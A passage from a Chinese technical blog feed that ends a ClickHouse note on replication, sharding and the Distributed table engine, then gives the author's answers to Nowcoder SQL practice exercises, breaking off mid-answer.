src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211110104410.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li><li><p>MUTATION的核心执行流程</p><ol><li>推送MUTATION日志</li><li>所有副本实例各自监听MUTATION日志</li><li>由主副本实例响应MUTATION日志并推送Log日志</li><li>各个副本实例分别拉取Log日志</li><li>各个副本实例分别在本地执行MUTATION</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211110104432.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li><li><p>ALTER的核心执行流程</p><ol><li>修改共享元数据</li><li>监听共享元数据变更并各自执行本地修改</li><li>确认所有副本完成修改</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211110104609.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li></ul><h3 id="10-4-数据分片"><a href="#10-4-数据分片" class="headerlink" title="10.4 数据分片"></a>10.4 数据分片</h3><p>通过引入副本可以有效降低数据丢失的风险（多份存储），并提升查询的性能（分摊查询、读写分离），但是仍没有解决数据表容量的问题。每个副本保存了数据表全量的数据，所以在业务庞大的场景中，依靠副本并不能解决单表的性能瓶颈，所以需要将数据水平切分，也就分片（shard）。</p><p>数据表A分布在N个ClickHouse服务节点，且这些数据彼此之间没有重复数据，则称为数据表A有N个分片。为了进一步考虑数据在写入时，如何被均匀地写至各个分片，以及查询时路由到每个分片并组成结果集，所以ClickHouse的数据分片需要结合Distributed表引擎一同使用，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211110110330.png" srcset="/img/loading.gif" lazyload="" width="60%"></p><p>Distributed表引擎自身不存储任何数据，它能够作为分布式表的一层透明代理，在集群内部自动开展数据的写入、分发、查询、路由等工作。</p><p>接下来以创建test_1_local的过程为例子，解释分布式DDL的核心执行流程</p><ul><li><p>分布式DDL的核心执行流程</p><ol><li>推送DDL日志</li><li>拉取日志并执行</li><li>确认执行进度</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211110110947.png" srcset="/img/loading.gif" lazyload="" width="60%"></p></li></ul><h3 id="10-5-Distributed原理解析"><a href="#10-5-Distributed原理解析" class="headerlink" title="10.5 Distributed原理解析"></a>10.5 Distributed原理解析</h3><p>Distributed表引擎是作为数据分片的透明代理，能自动路由数据至集群中的各个节点，所以Distributed表引擎和其他数据表一起协同工作，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211110112518.png" srcset="/img/loading.gif" lazyload="" width="60%"></p><ul><li>本地表：通常以 _local 为后缀进行命名。本地表是承载数据的载体，可以使用非Distributed的任意表引擎，一张本地表对应了一个数据分片</li><li>分布式表：通常以 _all 为后缀进行命名。分布式表只能用Distributed表引擎，它与本地表形成一对多的映射关系，日后将通过分布式表代理操作多张本地表<section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>幂等性：指多次操作,结果是一致。 数学表达式为： f(x) = f(f(x))<br><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>牛客SQL二刷</title>
      <link href="/2021/10/04/%E7%89%9B%E5%AE%A2SQL%E4%BA%8C%E5%88%B7/"/>
      <url>/2021/10/04/%E7%89%9B%E5%AE%A2SQL%E4%BA%8C%E5%88%B7/</url>
      
        <content type="html"><![CDATA[<p>二刷牛客80道SQL题</p><a id="more"></a><p><a href="https://www.nowcoder.com/activity/oj?tab=1" target="_blank" rel="noopener">牛客SQL题</a></p><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> hire_date == ( <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">MAX</span>(hire_date) <span class="hljs-keyword">FROM</span> employees )</code></pre></div><p>或</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> hire_date <span class="hljs-keyword">DESC</span><span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span></code></pre></div><p>错误写法：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> emp_no,<span class="hljs-keyword">MAX</span>(hire_date),first_name,last_name,gender,hire_date <span class="hljs-keyword">FROM</span> employees</code></pre></div><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> hire_date <span class="hljs-keyword">DESC</span><span class="hljs-keyword">LIMIT</span> <span class="hljs-number">2</span>,<span class="hljs-number">1</span></code></pre></div><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t1.emp_no,t1.salary,t1.from_date,t1.to_date,t2.dept_no <span class="hljs-keyword">FROM</span> salaries t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> dept_manager t2<span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no<span class="hljs-keyword">WHERE</span> t2.dept_no <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> t1.emp_no</code></pre></div><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t1.last_name,t1.first_name,t2.dept_no <span class="hljs-keyword">FROM</span> employees t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> dept_emp t2<span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no<span class="hljs-keyword">WHERE</span> t2.dept_no <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span></code></pre></div><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t1.last_name,t1.first_name,t2.dept_no <span class="hljs-keyword">FROM</span> employees t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> dept_emp t2<span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no</code></pre></div><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> emp_no,<span class="hljs-keyword">COUNT</span>(emp_no) <span class="hljs-keyword">AS</span> t <span class="hljs-keyword">FROM</span> salaries<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> emp_no<span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(emp_no) &gt; <span class="hljs-number">15</span></code></pre></div><h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> salary <span class="hljs-keyword">FROM</span> salaries<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> salary <span class="hljs-keyword">DESC</span></code></pre></div><h4 id="10"><a href="#10" class="headerlink" title="10"></a>10</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> emp_no <span class="hljs-keyword">FROM</span> employees<span class="hljs-keyword">WHERE</span> emp_no <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> emp_no <span class="hljs-keyword">FROM</span> dept_manager)</code></pre></div><h4 id="11"><a href="#11" class="headerlink" title="11"></a>11</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t1.emp_no,t2.emp_no <span class="hljs-keyword">FROM</span> dept_emp t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> dept_manager t2<span class="hljs-keyword">ON</span> t1.dept_no = t2.dept_no <span class="hljs-keyword">WHERE</span> t1.emp_no &lt;&gt; t2.emp_no</code></pre></div><h4 id="12"><a href="#12" class="headerlink" title="12"></a>12</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t1.dept_no,t1.emp_no,t2.salary<span class="hljs-keyword">FROM</span> dept_emp t1<span class="hljs-keyword">JOIN</span> salaries t2<span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no<span class="hljs-keyword">WHERE</span> (dept_no,salary) <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> dept_no,<span class="hljs-keyword">MAX</span>(salary) <span class="hljs-keyword">AS</span> salary     <span class="hljs-keyword">FROM</span> dept_emp t1    <span class="hljs-keyword">JOIN</span> salaries t2    <span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> dept_no)<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> t1.dept_no</code></pre></div><h4 id="15"><a href="#15" class="headerlink" title="15"></a>15</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employees<span class="hljs-keyword">WHERE</span> emp_no % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> last_name &lt;&gt; <span class="hljs-string">'Mary'</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> hire_date <span class="hljs-keyword">DESC</span></code></pre></div><h4 id="16"><a href="#16" class="headerlink" title="16"></a>16</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t1.title,<span class="hljs-keyword">AVG</span>(t2.salary) <span class="hljs-keyword">FROM</span> titles t1<span class="hljs-keyword">JOIN</span> salaries t2<span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> t1.title<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">AVG</span>(t2.salary)</code></pre></div><h4 id="17"><a href="#17" class="headerlink" title="17"></a>17</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> emp_no,salary <span class="hljs-keyword">FROM</span> salaries<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> salary <span class="hljs-keyword">DESC</span><span class="hljs-keyword">LIMIT</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span></code></pre></div><h4 id="18"><a href="#18" class="headerlink" title="18"></a>18</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t2.emp_no,t2.salary,t1.last_name,t1.first_name <span class="hljs-keyword">FROM</span> employees t1<span class="hljs-keyword">JOIN</span> salaries t2<span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no<span class="hljs-keyword">WHERE</span> salary <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">MAX</span>(salary) <span class="hljs-keyword">AS</span> salary <span class="hljs-keyword">FROM</span> salaries    <span class="hljs-keyword">WHERE</span> salary &lt; (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">MAX</span>(salary) <span class="hljs-keyword">AS</span> salary <span class="hljs-keyword">FROM</span> salaries))</code></pre></div><h4 id="19"><a href="#19" class="headerlink" title="19"></a>19</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> last_name,first_name,dept_name <span class="hljs-keyword">FROM</span> employees t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> dept_emp t2 <span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> departments t3 <span class="hljs-keyword">ON</span> t2.dept_no = t3.dept_no</code></pre></div><h4 id="21"><a href="#21" class="headerlink" title="21"></a>21</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> emp_no,(EndSalary- StartSalary) <span class="hljs-keyword">AS</span> growth <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> t1.emp_no,t2.salary <span class="hljs-keyword">AS</span> EndSalary,t3.salary <span class="hljs-keyword">AS</span> StartSalary    <span class="hljs-keyword">FROM</span> salaries t1    <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (        <span class="hljs-keyword">SELECT</span> emp_no,salary <span class="hljs-keyword">FROM</span> salaries        <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">to_date</span>=<span class="hljs-string">'9999-01-01'</span>    ) t2 <span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no    <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (        <span class="hljs-keyword">SELECT</span> salaries.emp_no,salary <span class="hljs-keyword">FROM</span> salaries        <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> employees <span class="hljs-keyword">ON</span> salaries.emp_no = salaries.emp_no        <span class="hljs-keyword">WHERE</span> from_date = hire_date        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> salaries.emp_no    ) t3 <span class="hljs-keyword">ON</span> t2.emp_no = t3.emp_no    <span class="hljs-keyword">WHERE</span> t1.emp_no <span class="hljs-keyword">IN</span> (        <span class="hljs-comment">-- 查询在职员工编号</span>        <span class="hljs-keyword">SELECT</span> emp_no <span class="hljs-keyword">FROM</span> salaries        <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">to_date</span>=<span class="hljs-string">'9999-01-01'</span>    )    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> t1.emp_no) t<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> (EndSalary- StartSalary)</code></pre></div><p>错误写法（这种没考虑到降薪的情况）：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> emp_no,(MaxSalary- MinSalary) <span class="hljs-keyword">AS</span> growth <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> emp_no,<span class="hljs-keyword">MAX</span>(salary) <span class="hljs-keyword">AS</span> MaxSalary,<span class="hljs-keyword">MIN</span>(salary)  <span class="hljs-keyword">AS</span> MinSalary    <span class="hljs-keyword">FROM</span> salaries    <span class="hljs-keyword">WHERE</span> emp_no <span class="hljs-keyword">IN</span> (        <span class="hljs-comment">-- 查询在职员工编号</span>        <span class="hljs-keyword">SELECT</span> emp_no <span class="hljs-keyword">FROM</span> salaries        <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">to_date</span>=<span class="hljs-string">'9999-01-01'</span>    )    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> emp_no) t<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> (MaxSalary- MinSalary)</code></pre></div><h4 id="22"><a href="#22" class="headerlink" title="22"></a>22</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t3.dept_no,t3.dept_name,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">FROM</span> salaries t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> dept_emp t2 <span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> departments t3 <span class="hljs-keyword">ON</span> t2.dept_no = t3.dept_no<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> t3.dept_no<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> t3.dept_no</code></pre></div><h4 id="23"><a href="#23" class="headerlink" title="23"></a>23</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> emp_no,salary,<span class="hljs-keyword">DENSE_RANK</span>() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> salary <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">FROM</span> salaries</code></pre></div><h4 id="24"><a href="#24" class="headerlink" title="24"></a>24</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t3.dept_no,t1.emp_no,t2.salary <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employees    <span class="hljs-keyword">WHERE</span> emp_no <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (        <span class="hljs-keyword">SELECT</span> emp_no <span class="hljs-keyword">FROM</span> dept_manager    )) t1 <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> salaries) t2 <span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> dept_emp) t3 <span class="hljs-keyword">ON</span> t2.emp_no = t3.emp_no<span class="hljs-keyword">WHERE</span> t3.dept_no <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span></code></pre></div><h4 id="25"><a href="#25" class="headerlink" title="25"></a>25</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t1.emp_no,t4.emp_no,t1.salary,t4.salary<span class="hljs-keyword">FROM</span> salaries t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> dept_emp t2 <span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> dept_manager t3 <span class="hljs-keyword">ON</span> t2.dept_no = t3.dept_no<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> salaries t4 <span class="hljs-keyword">ON</span> t3.emp_no = t4.emp_no<span class="hljs-keyword">WHERE</span> t1.salary &gt; t4.salary</code></pre></div><h4 id="26"><a href="#26" class="headerlink" title="26"></a>26</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t1.dept_no,t3.dept_name,t2.title,<span class="hljs-keyword">COUNT</span>(<span class="hljs-number">1</span>)<span class="hljs-keyword">FROM</span> dept_emp t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> titles t2 <span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> departments t3 <span class="hljs-keyword">ON</span> t1.dept_no = t3.dept_no<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> t1.dept_no,t3.dept_name,t2.title<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> t1.dept_no</code></pre></div><h4 id="28"><a href="#28" class="headerlink" title="28"></a>28</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t3.name,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">FROM</span> film t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> film_category t2 <span class="hljs-keyword">ON</span> t1.film_id = t2.film_id<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">category</span> t3 <span class="hljs-keyword">ON</span> t2.category_id = t3.category_id<span class="hljs-keyword">WHERE</span> t1.description <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'%robot%'</span> <span class="hljs-keyword">AND</span> t2.category_id <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> category_id <span class="hljs-keyword">FROM</span> film_category    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> category_id    <span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(*) &gt;= <span class="hljs-number">5</span>)<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> t3.name</code></pre></div><h4 id="29"><a href="#29" class="headerlink" title="29"></a>29</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t1.film_id,t1.title <span class="hljs-keyword">FROM</span> film t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> film_category t2 <span class="hljs-keyword">ON</span> t1.film_id = t2.film_id<span class="hljs-keyword">WHERE</span> t2.category_id <span class="hljs-keyword">IS</span> <span class="hljs-literal">NULL</span></code></pre></div><h4 id="30"><a href="#30" class="headerlink" title="30"></a>30</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t1.title,t1.description <span class="hljs-keyword">FROM</span> film t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> film_category t2 <span class="hljs-keyword">ON</span> t1.film_id = t2.film_id<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">category</span> t3 <span class="hljs-keyword">ON</span> t2.category_id = t3.category_id<span class="hljs-keyword">WHERE</span> t3.name = <span class="hljs-string">'Action'</span></code></pre></div><h4 id="32"><a href="#32" class="headerlink" title="32"></a>32</h4><ul><li>sqlite</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> last_name||<span class="hljs-string">' '</span>||first_name <span class="hljs-keyword">AS</span> <span class="hljs-keyword">Name</span> <span class="hljs-keyword">FROM</span> employees</code></pre></div><ul><li>MySQL</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CONCAT</span>(last_name,<span class="hljs-string">' '</span>,first_name) <span class="hljs-keyword">FROM</span> employees</code></pre></div><h4 id="33"><a href="#33" class="headerlink" title="33"></a>33</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> actor(    actor_id <span class="hljs-built_in">smallint</span>(<span class="hljs-number">5</span>) PRIMARY <span class="hljs-keyword">KEY</span>,    first_name <span class="hljs-built_in">varchar</span>(<span class="hljs-number">45</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,    last_name <span class="hljs-built_in">varchar</span>(<span class="hljs-number">45</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,    last_update <span class="hljs-built_in">date</span> <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>)</code></pre></div><h4 id="34"><a href="#34" class="headerlink" title="34"></a>34</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> actor<span class="hljs-keyword">VALUES</span>(<span class="hljs-number">1</span>,<span class="hljs-string">'PENELOPE'</span>,<span class="hljs-string">'GUINESS'</span>,<span class="hljs-string">'2006-02-15 12:34:33'</span>),      (<span class="hljs-number">2</span>,<span class="hljs-string">'NICK'</span>,<span class="hljs-string">'WAHLBERG'</span>,<span class="hljs-string">'2006-02-15 12:34:33'</span>)</code></pre></div><h4 id="35"><a href="#35" class="headerlink" title="35"></a>35</h4><ul><li>MySQL</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">IGNORE</span> <span class="hljs-keyword">INTO</span> actor <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">'3'</span>,<span class="hljs-string">'ED'</span>,<span class="hljs-string">'CHASE'</span>,<span class="hljs-string">'2006-02-15 12:34:33'</span>)</code></pre></div><ul><li>sqlite</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">IGNORE</span> <span class="hljs-keyword">INTO</span> actor <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">'3'</span>,<span class="hljs-string">'ED'</span>,<span class="hljs-string">'CHASE'</span>,<span class="hljs-string">'2006-02-15 12:34:33'</span>)</code></pre></div><h4 id="36"><a href="#36" class="headerlink" title="36"></a>36</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> actor_name(    first_name <span class="hljs-built_in">varchar</span>(<span class="hljs-number">45</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,    last_name <span class="hljs-built_in">varchar</span>(<span class="hljs-number">45</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> actor_name<span class="hljs-keyword">SELECT</span> first_name,last_name <span class="hljs-keyword">FROM</span> actor</code></pre></div><h4 id="37"><a href="#37" class="headerlink" title="37"></a>37</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> actor <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">UNIQUE</span> uniq_idx_firstname(first_name);<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> actor <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">UNIQUE</span> idx_lastname(last_name);</code></pre></div><h4 id="38"><a href="#38" class="headerlink" title="38"></a>38</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> actor_name_view <span class="hljs-keyword">AS</span> <span class="hljs-keyword">SELECT</span> first_name <span class="hljs-keyword">AS</span> first_name_v,last_name <span class="hljs-keyword">AS</span> last_name_v <span class="hljs-keyword">FROM</span> actor</code></pre></div><h4 id="39"><a href="#39" class="headerlink" title="39"></a>39</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> salaries <span class="hljs-keyword">FORCE</span> <span class="hljs-keyword">INDEX</span> (idx_emp_no) <span class="hljs-keyword">WHERE</span> emp_no = <span class="hljs-number">10005</span></code></pre></div><h4 id="40"><a href="#40" class="headerlink" title="40"></a>40</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> actor <span class="hljs-keyword">ADD</span> create_date datetime <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'2020-10-01 00:00:00'</span></code></pre></div><h4 id="41"><a href="#41" class="headerlink" title="41"></a>41</h4><p>（这个不是我写的）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">trigger</span> audit_log<span class="hljs-keyword">after</span> <span class="hljs-keyword">insert</span> <span class="hljs-keyword">on</span> employees_test<span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">row</span><span class="hljs-keyword">begin</span>    <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">audit</span> <span class="hljs-keyword">values</span>(new.id,new.name);<span class="hljs-keyword">end</span></code></pre></div><h4 id="42"><a href="#42" class="headerlink" title="42"></a>42</h4><ul><li>MySQL</li></ul><p><strong>MySQL中不允许在子查询的同时删除表数据（不能一边查一边把查的表删了）</strong>，所以可以把得出的表重命名（因为那样就不是原表了）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> titles_test<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> (        <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">MIN</span>(<span class="hljs-keyword">id</span>) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">id</span>,emp_no <span class="hljs-keyword">FROM</span> titles_test        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> emp_no    ) t)</code></pre></div><p>sqlite也能这样写</p><h4 id="43"><a href="#43" class="headerlink" title="43"></a>43</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> titles_test <span class="hljs-keyword">SET</span> <span class="hljs-keyword">to_date</span> = <span class="hljs-literal">null</span>,from_date =  <span class="hljs-string">'2001-01-01'</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">to_date</span> = <span class="hljs-string">'9999-01-01'</span></code></pre></div><h4 id="44"><a href="#44" class="headerlink" title="44"></a>44</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> titles_test <span class="hljs-keyword">SET</span> 